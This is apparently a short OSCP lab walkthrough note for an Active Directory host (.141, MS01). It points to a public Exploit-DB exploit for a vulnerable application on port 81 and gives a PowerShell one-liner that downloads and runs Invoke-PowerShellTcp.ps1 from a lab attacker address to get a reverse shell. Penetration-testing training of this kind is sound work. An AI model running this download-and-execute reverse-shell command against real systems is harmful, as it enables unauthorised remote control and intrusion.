# OSCP A

## Active Directory

### .141 MS01

on port :81 vulnerable application. Modify the exploit (remove /apsystem)

{% embed url="https://www.exploit-db.com/exploits/50801" %}

Upgrade the shell

{% code overflow="wrap" %}
```
powershell -c "iex(iwr -UseBasicParsing http://192.168.45.204/Invoke-PowerShellTcp.ps1)"
```
{% endcode %}

